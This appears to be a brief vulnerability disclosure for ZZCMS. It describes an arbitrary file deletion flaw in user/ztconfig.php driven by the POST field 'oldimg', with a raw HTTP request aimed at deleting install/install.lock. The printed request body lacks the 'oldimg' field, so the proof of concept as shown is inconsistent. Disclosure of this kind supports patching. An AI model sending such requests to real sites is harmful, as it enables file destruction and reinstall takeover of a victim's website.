

##user/ztconfig.php


Vulnerability：
![image](https://github.com/P0rZ9/ZZCMS/blob/master/5.jpg)

There is unlink($f) to delete any file by controlling the value of $f

##Control $f：
$oldbannerbg=isset($_POST["oldimg"])?$_POST["oldimg"]:'';


##Delete install/install.lock:
<pre><code>
POST /user/ztconfig.php?action=modify HTTP/1.1
Host: 127.0.0.1:85
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://127.0.0.1:85/user/ztconfig.php
Cookie: xxxxxx
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 232

swf=1.swf&bannerheight=0&comanestyle=center&comanecolor=%23FFFFFF&daohang%5B%5D=%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5&daohang%5B%5D=%E6%8B%9B%E5%95%86%E4%BF%A1%E6%81%AF&tongji=&baidu_map=&Submit2=+%E6%9B%B4%E6%96%B0%E8%AE%BE%E7%BD%AE
</code></pre>
![image](https://github.com/P0rZ9/ZZCMS/blob/master/6.jpg)


##delete install/install.lock successfully
![image](https://github.com/P0rZ9/ZZCMS/blob/master/7.jpg)

